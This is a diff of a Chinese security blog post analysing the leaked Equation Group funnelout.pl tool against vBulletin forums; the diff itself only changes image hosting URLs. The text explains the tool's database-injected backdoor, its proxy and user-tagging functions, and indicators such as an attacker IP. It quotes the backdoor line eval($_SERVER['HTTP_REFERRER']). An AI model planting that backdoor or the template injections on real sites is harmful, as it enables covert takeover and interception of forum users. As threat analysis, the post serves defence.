@@ -4,7 +4,7 @@ date: 2018-02-05 17:18:38
 tags: [backdoor,sec,vBulletin,Equation Group]
 categories: Security
 ---
-<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>
+<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>
 
 花了几天时间研究了一下Equation Group泄露的针对`vBulletin`论坛的定向攻击工具，期间非常感谢[风流@逢魔安全实验室](https://mp.weixin.qq.com/s/5WRXpljL7RFSPRQ2NdHhtA)的帮助，最主要的动力也是在技术分享上听了这个课题，感觉非常有意思，于是搭了环境研究了利用过程，期间也踩了好几个坑，整个过程下来却感受到脚本作者扎实的代码功底和缜密的逻辑，虽然是“过时”的工具了却有很多值得学习的地方。另外，这个过程是参考[Equation Group泄露工具之vBulletin无文件后门分析](https://paper.seebug.org/517/)进行的，只是把其中碰到的一些问题梳理一下，大家可以结合着看，希望能起到帮助。
 
@@ -37,7 +37,7 @@ vBulletin是国外知名的论坛程序，使用广泛，但在国内见得不�
 
 来看一下脚本的整体功能
 
-![funnelout.pl](https://ob5vt1k7f.qnssl.com/TbgPz)
+![funnelout.pl](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/TbgPz)
 
 `-op`参数展示了可以选择的操作，最主要的是`door`,`proxy`和`tag`功能，以及相应的`show`操作，我们也是选择这三部分功能进行分析
 
@@ -46,45 +46,45 @@ vBulletin是国外知名的论坛程序，使用广泛，但在国内见得不�
 #### Backdoor 功能分析
 这应该是脚本最简单粗暴的方法，直接在数据库中插入后门代码，之后通过HTTP请求中的`Referrer`字段发送指令，注意此处是`Referrer`而不是默认的`Referer`，隐蔽性非常好。
 
-![backdoor](https://ob5vt1k7f.qnssl.com/uLFsU)
+![backdoor](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/uLFsU)
 
 看一下插入后门的方法(在脚本中打印了执行的sql语句来方便理解)，可以看到插入后门的操作对页脚模板插入了一段base64编码后的代码`eval($_SERVER["HTTP_REFERRER"]);`，在页面渲染页脚部分时就会加载恶意代码，攻击者就可以通过`HTTP_REFERRER`字段下发指令，利用非常简单。我们来看一下它具体是如何实现的
 
-![op_door](https://ob5vt1k7f.qnssl.com/TPKug)
-![patch_db](https://ob5vt1k7f.qnssl.com/J1Q9m)
+![op_door](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/TPKug)
+![patch_db](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/J1Q9m)
 
 很简单的逻辑，将base64编码后的一句话代码插入`template`表的`footer`模板下，在`global.php`调用过程中被加载执行。
 
-![global.php](https://ob5vt1k7f.qnssl.com/06Abt)
+![global.php](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/06Abt)
 
-![debug](https://ob5vt1k7f.qnssl.com/wSBon)
+![debug](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/wSBon)
 
-![phpinfo](https://ob5vt1k7f.qnssl.com/Eumco)
+![phpinfo](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Eumco)
 
 #### Proxy 功能分析
 Proxy功能相对复杂一些，但也离不开对模板的操作，它涉及的是`header`模板
 
-![proxyTemplate](https://ob5vt1k7f.qnssl.com/gGsRT)
-![op_proxy](https://ob5vt1k7f.qnssl.com/KS5ci)
+![proxyTemplate](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/gGsRT)
+![op_proxy](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KS5ci)
 
 使用proxy时需要指定一个`tag`，而且tagurl需要符合正则表达式`/(.+?)\/.+?\/.+?\/(.+?)\/\d+\/(.+?)\/(.*)/`也就是`x.x.x.x/a/b/c/1/d/`的格式，这地方是个坑...
 
 指定tagurl生成相应的proxy代码
 
-![proxy](https://ob5vt1k7f.qnssl.com/1UrLg)
+![proxy](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1UrLg)
 解码后
 
-![proxy code](https://ob5vt1k7f.qnssl.com/oXMfY)
+![proxy code](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oXMfY)
 
 `$fahost`就是我们指定的tag的ip。当满足if条件——请求路径中含有`/`且ip不是`64.38.3.50`时，`header`渲染过程中会加载这些php代码，构造一个请求发送给我们的tagUrl。值得注意的是这里不仅支持GET请求，同样支持POST请求，也就是说我们可以作为“中间人”的角色时刻监听着用户与论坛之间的通信，实现了真正意义上的代理，而且用户在这过程中完全无法察觉到，细思极恐...
 
-![proxy request](https://ob5vt1k7f.qnssl.com/jEOhg)
+![proxy request](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/jEOhg)
 
 可以确定的是`64.38.3.50`这个ip一定与攻击组织有关，也许在测试的时候就将此ip排除在外，避免一些麻烦，同时这也是整个脚本泄露的唯一一个确定的ip。
 
 #### Tag 功能分析
 
-![op_tag](https://ob5vt1k7f.qnssl.com/NXTqW)
+![op_tag](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/NXTqW)
 Tag功能更加复杂，操作`navbar`模板，使用时有这么几个选项可以指定，`-tag`指定标记的url，`-nohttp`表示不自动加上`http://`，这种情况可以在正常访问时嵌入一个网站本身的url，`-f`Force，还有`ssl`选项，适用于https的情况。
 
 我们先用`-tag`指定一个`tag URL`
@@ -93,18 +93,18 @@ Tag功能更加复杂，操作`navbar`模板，使用时有这么几个选项可
 
 base64解码后的代码长这样
 
-![tag code](https://ob5vt1k7f.qnssl.com/kLa7C)
+![tag code](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/kLa7C)
 
 当我们访问文章页面`http://127.0.0.1/vb3/showthread.php?p=1`或访问私信链接`http://127.0.0.1/vb3/private.php?do=showpm&pmid=1`时，就会加载php代码，在`datastore`表生成一个“标签”——插入一个序列化后的`data`字段，类似`a:2:{i:0;i:1517970003;i:1;i:1;}`，其中最后的`i`是一个计数器，值在随机数[0,6]之间，每次访问页面时i值递减1，当i减到0时就会触发代码，向我们设置的`tag URL`发送用户名经过hex编码后的页面地址
 
-![tag code1](https://ob5vt1k7f.qnssl.com/FgW6h)
-![61646d696e.html](https://ob5vt1k7f.qnssl.com/pkQsP)
+![tag code1](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/FgW6h)
+![61646d696e.html](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pkQsP)
 ![61646d696e req](http://ob5vt1k7f.qnssl.com/qmk8S)(此处便于理解换了一个tag URL，并且新建了61646d696e.html文件)
 
 同时`tag`减至`-1`并出于等待重置状态，当我们进行`reset`操作时就会清空这条“标签”数据
 
-![showTagged](https://ob5vt1k7f.qnssl.com/0wgAc)
-![reset](https://ob5vt1k7f.qnssl.com/szepl)
+![showTagged](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/0wgAc)
+![reset](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/szepl)
 
 值得注意的是，“标签”功能只在一天内有效，超过一天后就无法触发，只能先进行重置操作
 
@@ -132,7 +132,7 @@ e6d290a03b70cfa5d4451da444bdea39 dbedd120e3d3cce1 (AR)
 
 而根据另一个特殊的字符串`l9ed39e2fea93e5`搜索，发现网上存在可能被攻击的案例，里面出现了一个域名`http://technology-revealed.com`
 
-![technology-revealed](https://ob5vt1k7f.qnssl.com/OFkMN)
+![technology-revealed](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/OFkMN)
 
 这几条线索之间的关系不得而知，或许对威胁情报能起到一起参考作用，虽然这个APT攻击已经过去好多年了。
 
